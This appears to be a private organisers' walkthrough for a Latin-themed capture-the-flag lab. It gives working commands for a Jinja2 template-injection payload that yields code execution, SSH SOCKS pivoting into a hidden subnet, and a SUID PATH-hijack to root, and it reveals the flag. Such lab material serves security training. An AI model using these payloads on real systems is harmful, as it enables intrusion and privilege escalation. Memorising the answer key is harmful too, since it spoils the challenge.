# WALKTHROUGH — "Ambiorix" (PRIVATE — organisers only)

> Complete intended solution path. Keep this out of players' hands at the con.
> Flag: **`flag{atuatuca_ambush_54bc}`**

## Overview

| | |
|---|---|
| **Category** | Web → Network pivoting → Linux privesc (multi-stage) |
| **Difficulty** | Medium |
| **Est. solve time** | 30–75 min (team of two) |
| **Flag** | `flag{atuatuca_ambush_54bc}` |

**Intended path (one line):** leaked creds → login → **Jinja2 SSTI → RCE** on
`castra` → read deploy notes → **SSH into `castra`** → read muster roll →
**SSH `-D` dynamic forward + proxychains** to the hidden `10.10.10.0/24` →
SSH into `arduenna` as `eburo` → **SUID-root PATH-hijack** → read `/root/flag.txt`.

```
your machine ── (host ports) ── castra(pivot) ── internal 10.10.10.0/24 ── arduenna(target)
                 :8080 / :2022   .10 / 10.10.10.5                          10.10.10.10
```

**Deploy:**

```bash
docker compose up -d --build        # pivot + target; castra published on :8080 / :2022
```

**Entry.** Players attack **from their own machine** against the pivot's
published host ports. This walkthrough uses `<lab-host>` for the lab address:

```
http://<lab-host>:8080      # castra's web console  (the foothold surface)
ssh scout@<lab-host> -p 2022   # castra's maintenance SSH  (once you find the creds)
```

> **Note on language:** everything the player sees in-environment is in **Latin**
> (web UI, login banners, deploy notes, muster roll, the SUID tool). English
> translations of every clue are inline below and collected in the glossary at
> the end. Credentials / IPs are literal ASCII.

All commands below are run from your own machine. `proxychains4` is configured
locally (`socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`) for the pivot stage.

---

## Stage 0 — Recon on the frontier

From your own machine, only `castra` is reachable, through its published ports;
the inner network does not exist yet from the player's point of view.

```bash
nmap -sT -p- <lab-host>                 # 2022/tcp ssh, 8080/tcp http (published)
curl -s http://<lab-host>:8080/         # Castra Legionis — Frontier Watch Console
```

---

## Stage 1 — Foothold: leaked creds → SSTI → RCE

### 1a. Find the leaked recruit account

The login page ships a dev-reminder in an HTML comment:

```bash
curl -s http://<lab-host>:8080/login | grep -i -- '-->'
# <!-- mandatum centurionis: tesseram communem recrutorum dele antequam in
#      proelium imus. etiamnunc valet: tiro / AveLegioXIV-54 -->
```

> *Translation:* "centurion's order: delete the recruits' shared password before
> we go to war. still works: **tiro / AveLegioXIV-54**." (`tessera` = the Roman
> army's literal word for a watchword/password.)

### 1b. Log in and find the injection point

Log in (keep a cookie jar), then probe the watch-report form. The **report body
is escaped** (safe); the **`sigil`** field is rendered through
`render_template_string()` → SSTI.

```bash
C=/tmp/jar
curl -s -c $C -b $C -d 'username=tiro&password=AveLegioXIV-54' http://<lab-host>:8080/login

# confirm the injection
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode 'sigil={{7*7}}' \
     http://<lab-host>:8080/board | grep -A1 'class="sigil"'
#   <pre class="sigil">49</pre>     <-- 7*7 rendered -> Jinja2 SSTI
```

> Note: a small "discipline filter" rejects the literal word `config` on a sigil
> (blocks the low-effort `{{config}}` dump). The intended RCE gadget avoids it.

### 1c. SSTI → RCE

Standard Jinja2 gadget (reaches `os` via `cycler`'s module globals):

```bash
RCE='{{ cycler.__init__.__globals__.os.popen("id").read() }}'
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$RCE" \
     http://<lab-host>:8080/board | grep -A1 'class="sigil"'
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution as **`www-data`** on `castra`.

### 1d. Loot the foothold (breadcrumb #1)

```bash
READ='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$READ" \
     http://<lab-host>:8080/board
```

The deploy notes reveal:
- maintenance SSH on `castra`: **`scout` / `FrontierWatch-54BC`**
- an **inner camp** at **`10.10.10.10` (arduenna)**, *not routable from the frontier*
- the inner-camp creds live in **scout's home directory**

(Confirm the pivot surface: `ip a` / `ip r` via the same RCE shows a **second NIC
`10.10.10.5/24`** on `castra`.)

---

## Stage 2 — Pivot into the hidden war-camp

### 2a. SSH into castra and read the muster roll (breadcrumb #2)

```bash
ssh scout@<lab-host> -p 2022               # password: FrontierWatch-54BC

scout@castra:~$ cat ~/muster.txt
#   Tabula militum — castra bellica interiora (arduenna, 10.10.10.10)
#     aditus ad castra ... eburo / ArduennaShadow
#     ...instrumentum ... a radice (root) possessum in /usr/local/bin ...
#        Fons in /usr/local/src est ...
scout@castra:~$ exit
```

> *Translation:* "Muster roll — inner war-camp (arduenna, 10.10.10.10). camp
> login: **eburo / ArduennaShadow**. …a **root-owned tool in `/usr/local/bin`**
> …its source is in `/usr/local/src`." → inner creds + a strong nudge at the
> SUID privesc.

### 2b. Open a SOCKS proxy through castra (SSH dynamic forward)

```bash
ssh -D 1080 -fN scout@<lab-host> -p 2022   # password: FrontierWatch-54BC
# proxychains4 reads socks5 127.0.0.1 1080 from /etc/proxychains4.conf (set this
# up once on your own machine if it isn't already the default).
```

### 2c. Confirm the inner network is now reachable

```bash
proxychains4 nmap -sT -Pn -p22 10.10.10.10     # 22/tcp open on arduenna
```

---

## Stage 3 — Inner objective: SUID PATH-hijack → root → flag

### 3a. SSH to the target through the tunnel

```bash
proxychains4 ssh -o StrictHostKeyChecking=no eburo@10.10.10.10
# password: ArduennaShadow
```

### 3b. Find the SUID misconfig

```bash
eburo@arduenna:~$ find / -perm -4000 -type f 2>/dev/null
#   ... /usr/local/bin/castellum

eburo@arduenna:~$ cat /usr/local/src/castellum.c      # source is readable
#   system("date +\"[castellum] recensio confirmata ...\"");
#   <-- SUID root calls `date` by RELATIVE name
```

`castellum` runs as root but calls `date` without an absolute path, inheriting
our `$PATH`.

### 3c. Hijack PATH to run code as root

```bash
eburo@arduenna:~$ cd /tmp
eburo@arduenna:/tmp$ printf '#!/bin/sh\n/bin/sh\n' > date   # or: cat /root/flag.txt
eburo@arduenna:/tmp$ chmod +x date
eburo@arduenna:/tmp$ PATH=/tmp:$PATH /usr/local/bin/castellum
[castellum] vices vigiliae probantur...      # "the watch rotation is checked..."
# id -> uid=0(root)
```

### 3d. Capture the flag

```bash
# cat /root/flag.txt
flag{atuatuca_ambush_54bc}
```

---

## Automated verification

`test/solve.sh` runs this entire path non-interactively from the host (against
the published ports) and asserts the flag:

```bash
docker compose up -d --build
./test/solve.sh                 # prints "==== PASS ====" + flag
```

## Intended path vs. traps

- **One intended path.** The only RCE surface is the `sigil` SSTI; report bodies
  are escaped. The only route to `arduenna` is the SSH `-D` pivot through
  `castra` (enforced by the `internal: true` network).
- **No guessing.** Every credential/host is discoverable (HTML comment →
  deploy notes → muster roll → readable SUID source). No brute force required.
  The Latin is a translation layer, not an obstacle: creds are literal ASCII and
  always in `nomen / tessera` form.
- **Alternate-but-equivalent pivots** (sshuttle / chisel / manual `ip route`
  through `castra`) also work — they're the same beat, not unintended wins.

## Latin glossary (clue → translation)

| Latin | English |
|---|---|
| `tessera` | watchword / password (Roman army term) |
| `mandatum centurionis` | the centurion's order |
| `tesseram … dele antequam in proelium imus` | delete the password before we go to war |
| `Ad stationem te confer` | report for duty |
| `Castra intra` / `Tessera reiecta` | enter the camp / password rejected |
| `Renuntiationem vigiliae defer` | file a watch report |
| `Signum (in tabula imprimendum)` | sigil (to be stamped on the tablet) — the SSTI field |
| `centurio hoc verbum in signo vetat` | the centurion forbids that word on a sigil (the `config` filter) |
| `commentarii de dispositione` | deployment notes (`DEPLOY_NOTES.txt`) |
| `aditus per SSH` | SSH access |
| `castra interiora … adiri NON possunt … transiliendo per hanc machinam` | the inner camp can't be reached except by hopping through this box |
| `Tabula militum` | muster roll (`muster.txt`) |
| `aditus ad castra` | login for the camp |
| `instrumentum … a radice (root) possessum … Fons in /usr/local/src` | a root-owned tool … source in `/usr/local/src` |
| `vices vigiliae probantur` | the watch rotation is being checked (`castellum` output) |
| `Ambiorix vigilat` | Ambiorix is watching (target MOTD) |
| `signum` (the objective) | the flag |
